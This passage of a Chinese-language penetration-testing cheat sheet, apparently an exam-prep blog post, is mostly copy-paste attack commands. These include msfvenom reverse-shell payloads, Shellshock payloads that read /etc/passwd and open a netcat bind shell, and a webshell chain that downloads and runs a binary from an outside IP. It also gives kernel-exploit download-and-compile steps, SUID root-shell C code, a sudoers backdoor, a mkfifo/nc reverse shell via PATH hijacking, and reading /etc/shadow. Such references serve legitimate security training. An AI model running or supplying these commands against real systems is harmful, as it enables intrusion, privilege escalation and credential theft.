+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>Shellcode</strong></p>
+<p>对于所有 shellcode，请参阅“msfvenom –help-formats”以获取有关有效参数的信息。Msfvenom 将输出可以用这种语言剪切和粘贴的代码，以供您利用</p>
+<p>Linux Based Shellcode</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Windows Based Shellcode</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Mac Based Shellcode</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>Handlers</strong> </p>
+<p>Metasploit Handlers 可以很好地快速设置 Metasploit 以接收传入的 shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler
+<span class="token builtin class-name">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span>
+<span class="token builtin class-name">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span>
+<span class="token builtin class-name">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span>
+<span class="token builtin class-name">set</span> ExitOnSession <span class="token boolean">false</span>
+exploit -j -z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Once the required values are completed 以下命令将执行您的处理程序</p>
+<p><code>msfconsole -L -r</code></p>
+<p>ssh to meterpreter</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+use post/multi/manage/shell_to_meterpreter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>SBD.exe</p>
+<p>sbd 是一个 Netcat 克隆，旨在便携并提供强大的加密。它在类 Unix 操作系统和 Microsoft Win32 上运行。sbd 具有 AES-CBC-128 + HMAC-SHA1 加密（由 Christophe Devine 提供）、程序执行（-e 选项）、选择源端口、连续重新连接延迟以及其他一些不错的功能。sbd 仅支持 TCP/IP 通信。sbd.exe（Kali linux 发行版的一部分：/usr/share/windows-binaries/backdoors/sbd.exe）可以作为 Netcat 替代品上传到 windows </p>
+<p>Shellshock</p>
+<ul>
+<li>Nmap测试Shellshock</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV -p <span class="token number">80</span> --script http-shellshock --script-args <span class="token assign-left variable">uri</span><span class="token operator">=</span>/cgi-bin/admin.cgi <span class="token variable">$ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>git clone <a target="_blank" rel="noopener" href="https://github.com/nccgroup/shocker">https://github.com/nccgroup/shocker</a></li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./shocker.py -H TARGET --command <span class="token string">"/bin/cat /etc/passwd"</span> -c /cgi-bin/status --verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li><p>Shell Shock SSH Forced Command<br>通过使用 ssh 启用所有debug输出来检查强制命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -vvv  
+<span class="token function">ssh</span> -i noob noob@<span class="token variable">$ip</span> <span class="token string">'() &#123; :;&#125;; /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li><p>cat file (view file contents)</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> -e <span class="token string">"HEAD /cgi-bin/status HTTP/1.1<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>nUser-Agent: () &#123;:;&#125;; echo <span class="token entity" title="\\">\\</span><span class="token variable"><span class="token variable">$(</span><span class="token operator">&lt;</span>/etc/passwd<span class="token variable">)</span></span><span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>nHost:vulnerable<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>nConnection: close<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n"</span> <span class="token operator">|</span> <span class="token function">nc</span> TARGET <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>Shell Shock run bind shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> -e <span class="token string">"HEAD /cgi-bin/status HTTP/1.1<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>nUser-Agent: () &#123;:;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>nHost:vulnerable<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>nConnection: close<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n"</span> <span class="token operator">|</span> <span class="token function">nc</span> TARGET <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ul>
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -m SimpleHTTPServer <span class="token number">80</span>
+python3 -m http.server
+ruby -rwebrick -e <span class="token string">"WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"</span>
+php -S <span class="token variable">$ip</span>:80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以粘贴到命令行的 Windows 文件传输脚本。如果没有 Meterpreter shell，文件传输到 Windows 机器可能会很棘手。可以将以下脚本复制并粘贴到基本的 windows 反向 shell 中，并用于从 Web 服务器传输文件（每个新行后都需要 timeout 1 命令）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> Set args <span class="token operator">=</span> Wscript.Arguments  <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> Url <span class="token operator">=</span> <span class="token string">"http://1.1.1.1/windows-privesc-check2.exe"</span>  <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> dim xHttp: Set xHttp <span class="token operator">=</span> createobject<span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span>  <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> dim bStrm: Set bStrm <span class="token operator">=</span> createobject<span class="token punctuation">(</span><span class="token string">"Adodb.Stream"</span><span class="token punctuation">)</span>  <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> xHttp.Open <span class="token string">"GET"</span>, Url, False  <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> xHttp.Send  <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> with bStrm      <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> 	.type <span class="token operator">=</span> <span class="token number">1</span> <span class="token string">'      >> webdl.vbs
+timeout 1
+echo 	.open      >> webdl.vbs
+timeout 1
+echo 	.write xHttp.responseBody      >> webdl.vbs
+timeout 1
+echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '</span>  <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span> end with <span class="token operator">>></span> webdl.vbs
+<span class="token function">timeout</span> <span class="token number">1</span>
+<span class="token builtin class-name">echo</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该文件可以使用以下语法运行：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>cscript.exe webdl.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>挂载文件共享<ul>
+<li>将 NFS 共享挂载到 /mnt/nfs<br>mount $ip:/vol/share /mnt/nfs</li>
+</ul>
+</li>
+<li>HTTP Put<br>nmap -p80 $ip —script http-put —script-args http-put.url=’/test/sicpwn.php’,http-put.file=’/var/www/html/sicpwn.php</li>
+</ul>
+<p>SCP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
+
+<span class="token function">scp</span> localfile username@<span class="token variable">$ip</span>:~/Folder/
+
+<span class="token function">scp</span> Linux_Exploit_Suggester.pl bob@192.168.1.10:~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Davtest - 自动上传后门，目标启用了 PUT 方法</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cldrn/davtest">https://github.com/cldrn/davtest</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">davtest -move -sendbd auto -url http://<span class="token variable">$ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>curl</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUT 方法上传文件
+<span class="token function">curl</span> -T <span class="token string">'leetshellz.txt'</span> <span class="token string">'http://$ip'</span>
+
+MOVE 方法将其重命名为可执行文件
+<span class="token function">curl</span> -X MOVE --header <span class="token string">'Destination:http://$ip/leetshellz.php'</span> <span class="token string">'http://$ip/leetshellz.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用有限的php shell cmd上传shell，使用webshell下载并执行meterpreter</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -s --data <span class="token string">"cmd=wget http://174.0.42.42:8000/dhn -O /tmp/evil"</span> http://<span class="token variable">$ip</span>/files/sh.php
+<span class="token function">curl</span> -s --data <span class="token string">"cmd=chmod 777 /tmp/evil"</span> http://<span class="token variable">$ip</span>/files/sh.php
+<span class="token function">curl</span> -s --data <span class="token string">"cmd=bash -c /tmp/evil"</span> http://<span class="token variable">$ip</span>/files/sh.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>TFTP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /tftp
+atftpd --daemon --port <span class="token number">69</span> /tftp
+<span class="token function">cp</span> /usr/share/windows-binaries/nc.exe /tftp/
+
+WINDOWS 主机执行
+C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Offsec<span class="token operator">></span>tftp -i <span class="token variable">$ip</span> get nc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>FTP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> pure-ftpd
+
+<span class="token comment">#!/bin/bash</span>
+<span class="token function">groupadd</span> ftpgroup
+<span class="token function">useradd</span> -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw <span class="token function">useradd</span> offsec -u ftpuser -d /ftphome
+pure-pw mkdb
+<span class="token builtin class-name">cd</span> /etc/pure-ftpd/auth/
+<span class="token function">ln</span> -s <span class="token punctuation">..</span>/conf/PureDB 60pdb
+<span class="token function">mkdir</span> -p /ftphome
+<span class="token function">chown</span> -R ftpuser:ftpgroup /ftphome/
+
+/etc/init.d/pure-ftpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>文件打包</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">打包可执行文件
+upx -9 nc.exe
+
+exe2bat - 将 EXE 转换为可以复制和粘贴的文本文件
+<span class="token function">locate</span> exe2bat
+wine exe2bat.exe nc.exe nc.txt
+
+Veil - Evasion Framework
+<span class="token function">git</span> clone https://github.com/Veil-Framework/Veil-Evasion.git
+<span class="token builtin class-name">cd</span> Veil-Evasion/
+<span class="token builtin class-name">cd</span> setup
+setup.sh -c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><p>资源</p>
+<p><a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
+<p>显而易见的尝试</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span>
+<span class="token function">sudo</span> <span class="token function">su</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">哪些用户可以登录此shell
+<span class="token function">grep</span> -vE <span class="token string">"nologin|false"</span> /etc/passwd
+内核版本以及漏洞查询
+<span class="token function">uname</span> -a
+searchsploit linux kernel <span class="token number">3.2</span> --exclude<span class="token operator">=</span><span class="token string">"(PoC)|/dos/"</span>
+查看连接
+<span class="token function">netstat</span> -tulpn
+哪些服务以 root 身份运行
+<span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> root
+哪些文件以 root / SUID / GUID 运行
+<span class="token function">find</span> / -perm +2000 -user root -type f -print
+<span class="token function">find</span> / -perm -1000 -type d <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null   <span class="token comment"># Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span>
+<span class="token function">find</span> / -perm -g<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null    <span class="token comment"># SGID (chmod 2000) - run as the group, not the user who started it.</span>
+<span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null    <span class="token comment"># SUID (chmod 4000) - run as the owner, not the user who started it.</span>
+<span class="token function">find</span> / -perm -g<span class="token operator">=</span>s -o -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null    <span class="token comment"># SGID or SUID</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">locate</span> -r <span class="token string">"bin$"</span><span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">find</span> <span class="token variable">$i</span> <span class="token punctuation">\</span><span class="token punctuation">(</span> -perm -4000 -o -perm -2000 <span class="token punctuation">\</span><span class="token punctuation">)</span> -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">done</span>
+<span class="token function">find</span> / -perm -g<span class="token operator">=</span>s -o -perm -4000 <span class="token operator">!</span> -type l -maxdepth <span class="token number">3</span> -exec <span class="token function">ls</span> -ld <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+什么文件夹是world-writeable
+<span class="token function">find</span> / -writable -type d <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null      <span class="token comment"># world-writeable folders</span>
+<span class="token function">find</span> / -perm -222 -type d <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null     <span class="token comment"># world-writeable folders</span>
+<span class="token function">find</span> / -perm -o w -type d <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null     <span class="token comment"># world-writeable folders</span>
+<span class="token function">find</span> / -perm -o x -type d <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null     <span class="token comment"># world-executable folders</span>
+<span class="token function">find</span> / <span class="token punctuation">\</span><span class="token punctuation">(</span> -perm -o w -perm -o x <span class="token punctuation">\</span><span class="token punctuation">)</span> -type d <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null   <span class="token comment"># world-writeable &amp; executable folders</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>linux 枚举脚本</p>
+<p><a target="_blank" rel="noopener" href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+<p><a target="_blank" rel="noopener" href="https://highon.coffee/downloads/linux-local-enum.sh">https://highon.coffee/downloads/linux-local-enum.sh</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/reider-roque/linpostexp">https://github.com/reider-roque/linpostexp</a></p>
+<p>Kernel Exploits</p>
+<ul>
+<li><p>CVE-2010-2959 - ‘CAN BCM’ Privilege Escalation - Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/14814">https://www.exploit-db.com/exploits/14814</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
+$ gcc i-can-haz-modharden.c -o i-can-haz-modharden
+$ ./i-can-haz-modharden
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> launching root shell<span class="token operator">!</span>
+<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/15285">https://www.exploit-db.com/exploits/15285</a></p>
+</li>
+<li><p>CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)<br><a target="_blank" rel="noopener" href="https://git.zx2c4.com/CVE-2012-0056/about/">https://git.zx2c4.com/CVE-2012-0056/about/</a><br>Linux CVE 2012-0056</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -O exploit.c http://www.exploit-db.com/download/18411 
+gcc -o mempodipper exploit.c  
+./mempodipper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8<br><a target="_blank" rel="noopener" href="https://dirtycow.ninja/">https://dirtycow.ninja/</a><br>First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016</p>
+</li>
+<li><p>以 root 以外的用户身份运行命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>添加用户或更改密码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/sbin/useradd -p <span class="token string">'openssl passwd -1 thePassword'</span> haxzor  
+<span class="token builtin class-name">echo</span> thePassword <span class="token operator">|</span> <span class="token function">passwd</span> haxzor --stdin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li><p>Linux 中的本地权限提升漏洞利用</p>
+<ul>
+<li><p><strong>SUID</strong> ( <strong>S</strong>et owner User <strong>ID</strong> <strong>up</strong> on execution)<br>通常需要 SUID C 二进制文件以超级用户身份生成 shell，您可以根据需要更新 UID/GID 和 shell</p>
+<p>以下是各种 shell 的一些快速复制和粘贴示例：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">SUID C Shell <span class="token keyword">for</span> <span class="token operator">/</span>bin<span class="token operator">/</span>bash  
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+    <span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>  
+
+SUID C Shell <span class="token keyword">for</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh  
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+    <span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>  
+
+Building the SUID Shell binary  
+gcc <span class="token operator">-</span>o suid suid<span class="token punctuation">.</span>c  
+For <span class="token number">32</span> bit<span class="token operator">:</span>  
+gcc <span class="token operator">-</span>m32 <span class="token operator">-</span>o suid suid<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>从受限shell创建和编译 SUID（无文件传输）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"int main(void)&#123;<span class="token entity" title="\n">\n</span>setgid(0);<span class="token entity" title="\n">\n</span>setuid(0);<span class="token entity" title="\n">\n</span>system(<span class="token entity" title="\&quot;">\"</span>/bin/sh<span class="token entity" title="\&quot;">\"</span>);<span class="token entity" title="\n">\n</span>&#125;"</span> <span class="token operator">></span>privsc.c  
+gcc privsc.c -o privsc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+</ul>
+</li>
+<li><p>方便的命令，如果您可以让 root 用户运行它。无需密码即可将 www-data 用户添加到 Root SUDO 组</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers'</span> <span class="token operator">></span> /tmp/update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>您可能会发现 root 用户正在执行命令，您可以修改系统 PATH 环境变量来执行您的命令。在下面的示例中，ssh 被替换为连接到端口 4444 上的 10.10.10.1 的反向 shell SUID</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"/tmp:/usr/local/bin:/usr/bin:/bin"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.10.1 4444 >/tmp/f"</span> <span class="token operator">>></span> /tmp/ssh
+<span class="token function">chmod</span> +x <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>SearchSploit</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit –uncsearchsploit apache <span class="token number">2.2</span>  
+searchsploit <span class="token string">"Linux Kernel"</span>  
+searchsploit linux <span class="token number">2.6</span> <span class="token operator">|</span> <span class="token function">grep</span> -i ubuntu <span class="token operator">|</span> <span class="token function">grep</span> <span class="token builtin class-name">local</span>  
+searchsploit slmail<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>内核版本 3.0.0 的内核利用建议</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k <span class="token number">3.0</span>.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>预编译的 Linux 内核漏洞利用 - <strong><em>如果目标机器上未安装 GCC，则非常方便！</em></strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+</li>
+<li><p>收集root密码</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shadow <span class="token operator">|</span><span class="token function">grep</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>查找并显示 proof.txt 或 flag.txt</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> <span class="token variable"><span class="token variable">`</span><span class="token function">find</span> / -name proof.txt -print<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ul>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>资源</p>
+<p><a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/16.html">https://fuzzysecurity.com/tutorials/16.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a></p>
+<p>显而易见的尝试</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span>
+net user <span class="token string">"%username%"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>meterpreter 的 getsystem 命令，很少起作用，但值得一试</p>
+<p>无需上传文件 Windows 权限升级基本信息收集，将以下内容复制并粘贴到 Kali 中的远程 Windows shell 中以生成快速报告</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo --------- BASIC WINDOWS RECON ---------  <span class="token operator">></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+net config Workstation  <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
+systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS Name"</span> /C:<span class="token string">"OS Version"</span> <span class="token operator">>></span> report.txt
+<span class="token function">timeout</span> <span class="token number">1</span>
